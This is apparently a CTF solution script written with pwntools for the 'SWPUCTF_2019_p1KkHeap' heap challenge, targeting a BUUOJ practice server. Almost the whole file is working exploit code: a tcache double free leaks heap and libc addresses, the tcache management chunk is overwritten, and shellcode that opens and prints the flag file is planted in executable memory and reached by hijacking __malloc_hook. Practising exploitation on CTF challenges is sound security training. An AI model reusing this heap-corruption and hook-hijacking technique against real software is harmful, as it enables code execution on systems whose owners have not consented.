# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './SWPUCTF_2019_p1KkHeap'
elf = ELF(binary)
libc = elf.libc
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '28081'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda a          : int( p.recv(len(str(a)))[2:] , 16)
def dbg():
    gdb.attach(p)
    pause()

def bgdb(fun):
    gdb.attach(p,'b %s'%fun)

def cmd(num):
    sla('Choice:',num)

def add(size):
    cmd(1)
    sla("size:",size)

def show(id):
    cmd(2)
    sla("id:",id)

def edit(id,content):
    cmd(3)
    sla("id:",id)
    sa("content:",content)

def delete(id):
    cmd(4)
    sla("id:",id)

#控制tcache管理块，将shellcode写入0x66660000（初始分配的可读可写可执行的内存），通过__malloc_hook跳转到这里执行

add(0x100) #0
add(0x100) #1

delete(0)
delete(0)

show(0)
ru("content: ")
heap_addr = u64(p.recv(6).ljust(8,"\x00"))
lg("heap_addr",heap_addr)

add(0x100)
edit(2,p64(heap_addr - 0x250))
add(0x100)
add(0x100)

payload = p64(0x0707070707070707)*8
edit(4,payload)

delete(0)
show(0)
__malloc_hook =  l64() - 0x70

libc.address = __malloc_hook - libc.sym["__malloc_hook"]

shellcode=shellcraft.amd64.open('flag')
shellcode+=shellcraft.amd64.read(3,0x66660300,64)
shellcode+=shellcraft.amd64.write(1,0x66660300,64)

shellcode = asm(shellcode)

payload =  p64(0x0707070707070707) *8 + p64(__malloc_hook) + p64(0)*14 + p64(0x66660000)
edit(4,payload)
#dbg()

add(0x100)
edit(5,shellcode)
add(0x10)
edit(6,p64(0x66660000))

add(0x20)

p.interactive()

'''
@File    :   SWPUCTF_2019_p1KkHeap.py
@Time    :   2021/07/25 12:40:41
@Author  :   Niyah 
'''